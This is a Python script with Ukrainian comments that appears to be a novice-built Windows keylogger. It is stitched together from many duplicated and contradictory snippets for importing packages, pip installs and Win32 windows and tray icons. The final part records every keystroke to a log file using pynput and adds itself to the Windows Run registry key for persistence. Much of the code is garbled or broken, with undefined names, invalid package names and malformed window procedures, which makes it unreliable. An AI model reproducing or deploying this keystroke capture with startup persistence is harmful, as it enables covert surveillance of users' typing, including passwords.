import os
from datetime import datetime
from pynput import keyboard
import winreg
import win32con
import ctypes
import win32api
import win32gui
import win32api
import win32gui
import math
from win32api import GetModuleHandle
from win32gui import RegisterClass, CreateWindow, LoadIcon, \
                     LoadCursor, ShowWindow, UpdateWindow, \
                     NIF_ICON, NIF_MESSAGE, NIF_TIP, \
                     WNDCLASS, WM_CREATE, WM_DESTROY, \
                     IDC_ARROW, MSG, NOTIFYICONDATA, \
                     IDI_WINLOGO, SW_SHOW, SW_HIDE

import os
import shutil
import importlib

# Створюємо нову папку для модулів
modules_dir = os.path.join(os.getcwd(), 'modules')
os.mkdir(modules_dir)

# Список модулів, які необхідні для проекту
required_modules = ['pywin32', 'win32gui', 'pywin32.win32gui']

# Ітеруємося по списку модулів та перевіряємо наявність кожного з них
for module in required_modules:
    try:
        # Імпортуємо модуль
        importlib.import_module(module)
        print(f'{module} is already installed')
    except ImportError:
        # Якщо модуль відсутній, встановлюємо його та копіюємо в папку з модулями
        print(f'Installing {module}...')
        os.system(f'pip install {module} --target={modules_dir}')
        shutil.copytree(os.path.join(os.getcwd(), 'venv', 'Lib', 'site-packages', module),
                        os.path.join(modules_dir, module))
        print(f'{module} is installed and copied to modules folder')
    finally:
        # Імпортуємо модуль з нової папки з модулями
        importlib.invalidate_caches()
        sys.path.insert(0, modules_dir)
        globals()[module] = importlib.import_module(module)

# Виконуємо основний код проекту
# ...
import os
from datetime import datetime
from pynput import keyboard
import winreg
import win32con
import ctypes
import win32api
import win32gui
import win32api
import win32gui
import math
from win32api import GetModuleHandle
from win32gui import RegisterClass, CreateWindow, LoadIcon, \
                     LoadCursor, ShowWindow, UpdateWindow, \
                     NIF_ICON, NIF_MESSAGE, NIF_TIP, \
                     WNDCLASS, WM_CREATE, WM_DESTROY, \
                     IDC_ARROW, MSG, NOTIFYICONDATA, \
                     IDI_WINLOGO, SW_SHOW, SW_HIDE


import platform
import subprocess

if platform.system() == 'Windows':
    command = 'cmd /c'
else:
    command = 'bash -c'

try:
    import pywin32
except ImportError:
    subprocess.check_call(f"{command} pip install pywin32", shell=True)

try:
    import win32gui
except ImportError:
    subprocess.check_call(f"{command} pip install pywin32-ctypes", shell=True)




import importlib
try:
    import pywin32
    from pywin32.win32gui import *
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
    importlib.reload(pywin32)
    from pywin32.win32gui import *


import importlib

imported_objects = {os, sys, math,datetime,winreg, win32con, win32gui, win32api, ctypes, RegisterClass, CreateWindow, LoadIcon, \
                     LoadCursor, ShowWindow, UpdateWindow, \
                     NIF_ICON, NIF_MESSAGE, NIF_TIP, \
                     WNDCLASS, WM_CREATE, WM_DESTROY, \
                     IDC_ARROW, MSG, NOTIFYICONDATA, \
                     IDI_WINLOGO, SW_SHOW, SW_HIDE, pywin32.win32gui, keyboard, KeyboardInterrupt,GetModuleHandle,importlib,}

for obj in imported_objects:
    try:
        # Перевіряємо, чи існує об'єкт в поточному контексті
        obj_in_context = globals()[obj.__name__]
        # Якщо об'єкт існує, перевстановлюємо його
        globals()[obj.__name__] = importlib.reload(obj_in_context)
    except KeyError:
        # Якщо об'єкту немає в поточному контексті, імпортуємо його та встановлюємо
        globals()[obj.__name__] = __import__(obj.__name__)
    
    # Оновлюємо об'єкт
    obj = globals()[obj.__name__]
    obj.update()

import win32api
import win32con
import win32gui

class MyWindow:

    def __init__(self):
        win32gui.InitCommonControls()
        self.hinst = win32api.GetModuleHandle(None)
        className = 'MyWindow'
        message_map = {
            win32con.WM_DESTROY: self.OnDestroy,
            win32con.WM_PAINT: self.OnPaint,
        }

        wc = win32gui.WNDCLASS()
        wc.style = win32con.CS_HREDRAW | win32con.CS_VREDRAW
        wc.lpfnWndProc = message_map
        wc.cbWndExtra = 0
        wc.hCursor = win32gui.LoadCursor(None, win32con.IDC_ARROW)
        wc.hbrBackground = win32gui.GetStockObject(win32con.WHITE_BRUSH)
        wc.hIcon = win32gui.LoadIcon(None, win32con.IDI_APPLICATION)
        wc.hInstance = self.hinst
        wc.lpszClassName = className
        win32gui.RegisterClass(wc)

        style = win32con.WS_OVERLAPPEDWINDOW | win32con.WS_VISIBLE
        self.hwnd = win32gui.CreateWindowEx(
            win32con.WS_EX_CONTROLPARENT,
            className,
            'MyWindow Title',
            style,
            win32con.CW_USEDEFAULT,
            win32con.CW_USEDEFAULT,
            win32con.CW_USEDEFAULT,
            win32con.CW_USEDEFAULT,
            0,
            0,
            self.hinst,
            None
        )

        win32gui.UpdateWindow(self.hwnd)
        self.msg_loop()

    def msg_loop(self):
        while True:
            try:
                win32gui.PumpWaitingMessages()
            except KeyboardInterrupt:
                break

    def OnDestroy(self, hwnd, message, wparam, lparam):
        win32gui.PostQuitMessage(0)

    def OnPaint(self, hwnd, message, wparam, lparam):
        hdc, paint_struct = win32gui.BeginPaint(hwnd)

        rect = win32gui.GetClientRect(hwnd)
        win32gui.DrawText(
            hdc,
            'Hello, Windows!',
            -1,
            rect,
            win32con.DT_SINGLELINE | win32con.DT_CENTER | win32con.DT_VCENTER
        )

        win32gui.EndPaint(hwnd, paint_struct)


if __name__ == '__main__':
    w = MyWindow()


import win32gui

def create_window():
    # назва класу вікна
    classname = "MyWindowClass"
    # назва вікна
    windowname = "MyWindow"
    # стиль вікна
    style = win32gui.WS_OVERLAPPEDWINDOW
    # позиція та розмір вікна
    x, y, width, height = win32gui.CW_USEDEFAULT, win32gui.CW_USEDEFAULT, 640, 480
    # батьківське вікно
    parent = 0
    # меню
    menu = 0
    # ідентифікатор вікна
    hwnd = win32gui.CreateWindow(
        classname, windowname, style, x, y, width, height, parent, menu, 0, None
    )
    # відображення вікна
    win32gui.ShowWindow(hwnd, win32gui.SW_SHOW)
    # обробник повідомлень
    win32gui.PumpMessages()
    
create_window()

import win32gui
import win32con

def wndProc(hWnd, message, wParam, lParam):
    if message == win32con.WM_CREATE:
        # Код для обробки події створення вікна
        pass
    else:
        # Код для обробки інших подій
        pass

className = "MyClass"
windowName = "MyWindow"

wc = win32gui.WNDCLASS()
wc.lpfnWndProc = wndProc
wc.lpszClassName = className
wc.hInstance = win32gui.GetModuleHandle(None)
classAtom = win32gui.RegisterClass(wc)

hwnd = win32gui.CreateWindow(
    classAtom,
    windowName,
    0,
    0, 0, 0, 0,
    0,
    0,
    wc.hInstance,
    None
)

win32gui.UpdateWindow(hwnd)

# Головний цикл повідомлень
while True:
    message = win32gui.GetMessage(None, 0, 0)
    if message == 0:
        break
    win32gui.TranslateMessage(message)
    win32gui.DispatchMessage(message)
 
import win32gui
import win32con

def create_window():
    # Реєструємо клас вікна
    wc = win32gui.WNDCLASS()
    hinst = wc.hInstance = win32gui.GetModuleHandle(None)
    wc.lpszClassName = "MyWindowClass"
    wc.style = win32con.CS_VREDRAW | win32con.CS_HREDRAW
    wc.hCursor = win32gui.LoadCursor(0, win32con.IDC_ARROW)
    wc.hbrBackground = win32gui.GetStockObject(win32con.WHITE_BRUSH)
    wc.lpfnWndProc = {
        win32con.WM_CREATE: on_create,
        win32con.WM_DESTROY: on_destroy,
    }
    class_atom = win32gui.RegisterClass(wc)

    # Створюємо вікно
    hwnd = win32gui.CreateWindow(
        class_atom,
        "My Window",
        win32con.WS_OVERLAPPEDWINDOW,
        0, 0, 640, 480,
        None, None, hinst, None
    )

    return hwnd

def on_create(hwnd, message, wparam, lparam):
    print("WM_CREATE message received!")

def on_destroy(hwnd, message, wparam, lparam):
    print("WM_DESTROY message received!")
    win32gui.PostQuitMessage(0)

hwnd = create_window()
win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
win32gui.UpdateWindow(hwnd)

# Запускаємо головний цикл обробки повідомлень вікна
win32gui.PumpMessages()



import sys

import subprocess
import sys

try:
    from win32gui import WM_CREATE
except ImportError:
    def WM_CREATE(*args):
        return 0

def WM_CREATE(hwnd, msg, wparam, lparam):
    return 0


import win32api
import win32con
try:
    win32api.SendMessage(hwnd, win32con.WM_CREATE, 0, 0)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"])
    from pywin32 import WM_CREATE
 
import importlib

import subprocess

# Перевірка наявності пакету
def package_installed(package_name):
    return subprocess.call(f"pip show {package_name}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

# Встановлення пакету
def install_package(package_name):
    return subprocess.call(f"pip install {package_name}", shell=True)

# Оновлення пакету
def update_package(package_name):
    return subprocess.call(f"pip install --upgrade {package_name}", shell=True)

# Перевірка та встановлення пакету
def check_and_install_package(package_name):
    if not package_installed(package_name):
        install_package(package_name)
    else:
        update_package(package_name)

# Перелік пакетів, які необхідні для виконання коду
required_packages = ['pywin32']

# Перевірка наявності пакетів та їх встановлення
for package in required_packages:
    check_and_install_package(package)

# Тут розміщуємо код, який потребує наявності пакетів
from win32gui import RegisterClass, CreateWindow, LoadIcon

import subprocess
import importlib

def install(package):
    subprocess.check_call(["python", "-m", "pip", "install", package])

try:
    import win32gui
    from win32gui import RegisterClass, CreateWindow, LoadIcon, WM_CREATE
except ImportError:
    install("pywin32")
    importlib.reload(win32gui)
    from win32gui import RegisterClass, CreateWindow, LoadIcon, WM_CREATE

# перевірка наявності пакету
try:
    import win32gui
except ImportError:
    # якщо пакет відсутній, встановлюємо його
    import pip
    pip.main(['install', 'pywin32'])
    # перезавантажуємо пакет
    importlib.reload(win32gui)


from ctypes import windll

# Оголошуємо ідентифікатори для меню
IDM_EXIT = 1024
IDM_ABOUT = 1025

# Оголошуємо функцію обробки повідомлень за замовчуванням
def DefWindowProc(hwnd, msg, wparam, lparam):
    return windll.user32.DefWindowProcW(hwnd, msg, wparam, lparam)

def YourWndProc(hwnd, message, wParam, lParam):
    if message == WM_COMMAND:
        if wParam == IDM_EXIT:
            # Виконання дій для закриття програми
            DestroyWindow(hwnd)
        elif wParam == IDM_ABOUT:
            # Виконання дій для відображення вікна про програму
            pass
    elif message == WM_DESTROY:
        # Вихід з програми
        PostQuitMessage(0)
    else:
        # Обробка повідомлень за замовчуванням
        return DefWindowProc(hwnd, message, wParam, lParam)

import subprocess

def install(package):
    subprocess.check_call(['pip', 'install', package])

try:
    import tkinter
except ImportError:
    print("tkinter is not installed, installing...")
    install('tkinter')
    import tkinter

try:
    from win32api import GetModuleHandle, LoadIcon, LoadCursor, Shell_NotifyIcon, MessageBox
    from win32gui import RegisterClass, CreateWindow, NIF_ICON, NIF_MESSAGE, NIF_TIP, NIM_ADD, NIM_DELETE, NIM_MODIFY, \
        SetWindowLong, GetWindowLong, ShowWindow, UpdateWindow, DestroyWindow, PostQuitMessage, \
        PumpWaitingMessages, CreatePopupMenu, AppendMenu, TrackPopupMenu, GetCursorPos, DestroyMenu
    from win32con import WM_DESTROY, WM_COMMAND, WM_SYSCOMMAND, WM_USER, ICON_BIG, \
        IDC_ARROW, IDI_APPLICATION, SW_SHOW, SW_HIDE, MF_STRING, MF_SEPARATOR, \
        SC_CLOSE, GWL_WNDPROC, WM_QUIT, WM_LBUTTONUP, WM_RBUTTONUP
except ImportError:
    print("pywin32 is not installed, installing...")
    install('pywin32')
    from win32api import GetModuleHandle, LoadIcon, LoadCursor, Shell_NotifyIcon, MessageBox
    from win32gui import RegisterClass, CreateWindow, NIF_ICON, NIF_MESSAGE, NIF_TIP, NIM_ADD, NIM_DELETE, NIM_MODIFY, \
        SetWindowLong, GetWindowLong, ShowWindow, UpdateWindow, DestroyWindow, PostQuitMessage, \
        PumpWaitingMessages, CreatePopupMenu, AppendMenu, TrackPopupMenu, GetCursorPos, DestroyMenu
    from win32con import WM_DESTROY, WM_COMMAND, WM_SYSCOMMAND, WM_USER, ICON_BIG, \
        IDC_ARROW, IDI_APPLICATION, SW_SHOW, SW_HIDE, MF_STRING, MF_SEPARATOR, \
        SC_CLOSE, GWL_WNDPROC, WM_QUIT, WM_LBUTTONUP, WM_RBUTTONUP

import win32api
import win32gui
import win32con

# вікно
className = "MyWindowClass"
message = "Hello, World!"

# реєстрація класу вікна
wc = win32gui.WNDCLASS()
wc.lpfnWndProc = { YourWndProc }
wc.lpszClassName = className
classAtom = win32gui.RegisterClass(wc)

# створення вікна
hwnd = win32gui.CreateWindow(className, message, 0, 0, 0, 0, 0, 0, 0, classAtom, None)

# додавання іконки в трей
nid = (hwnd, 0, win32gui.NIF_ICON, win32con.WM_USER+20, win32api.LoadIcon(0, win32con.IDI_APPLICATION), "tooltip")
win32gui.Shell_NotifyIcon(win32gui.NIM_ADD, nid)

# створення меню
menu = win32gui.CreatePopupMenu()
win32gui.AppendMenu(menu, win32con.MF_STRING, 1023, "Exit")

# показати вікно
win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)

# основний цикл програми
while True:
    # обробка повідомлень
    msg = win32gui.GetMessage(None, 0, 0)
    if msg[0] == win32con.WM_QUIT:
        break
    if msg[0] == win32con.WM_USER+20:
        if msg[2] == win32con.WM_LBUTTONUP:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        elif msg[2] == win32con.WM_RBUTTONUP:
            x, y = win32gui.GetCursorPos()
            win32gui.SetForegroundWindow(hwnd)
            win32gui.TrackPopupMenu(menu, win32con.TPM_LEFTALIGN, x, y, 0, hwnd, None)
            win32gui.PostMessage(hwnd, win32con.WM_NULL, 0, 0)
            win32gui.SetForegroundWindow(None)
    else:
        win32gui.TranslateMessage(msg)
        win32gui.DispatchMessage(msg)

# видалення іконки з трею
win32gui.Shell_NotifyIcon(win32gui.NIM_DELETE, nid)

try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    os.makedirs('KeyLogs', exist_ok=True)
    log_file = os.path.join('KeyLogs', 'log.txt')

    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f'Цю програму створили Микита і Максимчик за допомогою Chat GPT\n\n')

    def on_press(key):
        key_text = f'{key}'
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f'{timestamp}: {key_text}\n')

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

except ImportError as e:
    print(f"Failed to import pynput module: {e}")
finally:
    print("Mykyta top")

def add_to_startup():

    app_name = "Keylogger"
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, os.path.realpath(__file__))
    winreg.CloseKey(key)

def create_tray_icon():
    
    icon_path = os.path.join(os.getcwd(), "icon.ico")

    # Register class and create window
    hinst = GetModuleHandle(None)
    wndclass = WNDCLASS()
    wndclass.hInstance = hinst
    wndclass.lpszClassName = "PythonTaskbar"
    message_map = {WM_CREATE: on_create, WM_DESTROY: on_destroy}
    wndclass.lpfnWndProc = message_map
    classAtom = RegisterClass(wndclass)
    style = win32con.WS_OVERLAPPED | win32con.WS_SYSMENU
    hwnd = CreateWindow(classAtom, "Keylogger", style, \
        0, 0, win32con.CW_USEDEFAULT, win32con.CW_USEDEFAULT, \
        0, 0, hinst, None)
    UpdateWindow(hwnd)

    # Set tray icon
    flags = NIF_ICON | NIF_MESSAGE | NIF_TIP
    nid = (hwnd, 0, flags, WM_USER + 20, LoadIcon(hinst, icon_path), "Keylogger")
    Shell_NotifyIcon(NIM_ADD, nid)

    return hwnd

def on_create(hwnd, msg, wparam, lparam):
    
    hinst = GetModuleHandle(None)
    icon_path = os.path.join(os.getcwd(), "icon.ico")
    hicon = LoadIcon(hinst, icon_path)
    hmenu = None
    flags = NIF_ICON | NIF_MESSAGE | NIF_TIP
    nid = (hwnd, 0, flags, WM_USER + 20, hicon, "Keylogger", hmenu, 0)
    Shell_NotifyIcon(NIM_ADD, nid)

def on_destroy(hwnd, msg, wparam, lparam):
    
    nid = (hwnd, 0)
    Shell_NotifyIcon(NIM_DELETE, nid)
    PostQuitMessage(0)

def handle_tray_icon(hwnd, msg, wparam, lparam):
    
    if lparam == WM_RBUTTONUP:
        hmenu = CreatePopupMenu()
        AppendMenu(hmenu, win32con.MF_STRING, WM_QUIT, "Exit")
        pos = win32gui.GetCursorPos()
        win32gui.SetForegroundWindow(hwnd)
        win32api.TrackPopupMenu(hmenu, win32con.TPM_LEFTALIGN, pos[0], pos[1], 0, hwnd, None)
        win32gui.PostMessage(hwnd, win32con.WM_NULL, 0, 0)
        win32gui.DestroyMenu(hmenu)
    elif lparam == WM_LBUTTONUP:
        pass

# Register hotkey
MOD_SHIFT = 0x4
HOTKEY_ID = 1
WM_HOTKEY = 0x0312
win32api.RegisterHotKey(None, HOTKEY_ID, MOD_SHIFT, 0x45)

# Add to startup
add_to_startup()

# Create tray icon and message pump
hwnd = create_tray_icon()
shell_msg = win32gui.RegisterWindowMessage("TaskbarCreated");
while True:
    try:
        msg = win32gui.GetMessage(None, 0, 0)
        if hwnd:
            (true, msg) = win32gui.PumpMessage()
            if true == 0:
                break
        else:
            break

        if msg.message == WM_HOTKEY:
            key = msg.wParam
            if key == HOTKEY_ID:
                break
            else:
                continue

        if msg.message == WM_DESTROY:
            break
        if msg.message == win32con.WM_QUIT:
            break
        if msg.message == shell_msg:
            hwnd = create_tray_icon()
    except Exception as e:
        print(e)
